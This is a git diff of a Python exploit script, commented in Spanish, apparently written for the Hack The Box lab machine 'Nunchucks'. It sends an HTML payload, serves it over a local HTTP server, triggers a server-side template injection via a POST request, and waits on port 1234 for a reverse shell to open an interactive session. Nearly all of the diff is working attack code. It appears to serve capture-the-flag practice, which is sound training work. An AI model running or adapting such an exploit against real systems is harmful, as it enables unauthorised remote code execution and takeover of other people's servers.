@@ -32,12 +32,7 @@ def ssti():
     print("[+] Explotando el SSTI")
     r = s.post(nunIP,data=post_data,verify=False)
 
-if __name__ == '__main__':
-
-    print("[!] Recuerda agregar el dominio nunchucks.htb y store.nunchucks.htb a tu /etc/hosts.")
-    html_payload()
-    sleep(2)
-    threading.Thread(target=ssti, args=()).start()
+def http_server():
 
     try:
         with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as so:
@@ -46,5 +41,13 @@ if __name__ == '__main__':
     except OSError:
             print("\n[-] El puerto 80 se encuentra en uso, no se ha podido ejectuar el servidor")
 
-    shell = listen(1234,timeout=10).wait_for_connection()
+
+if __name__ == '__main__':
+
+    print("[!] Recuerda agregar el dominio nunchucks.htb y store.nunchucks.htb a tu /etc/hosts.")
+    html_payload()
+    sleep(2)   
+    http_server()
+    threading.Thread(target=ssti, args=()).start()
+    shell = listen(1234,timeout=20).wait_for_connection()
     shell.interactive()
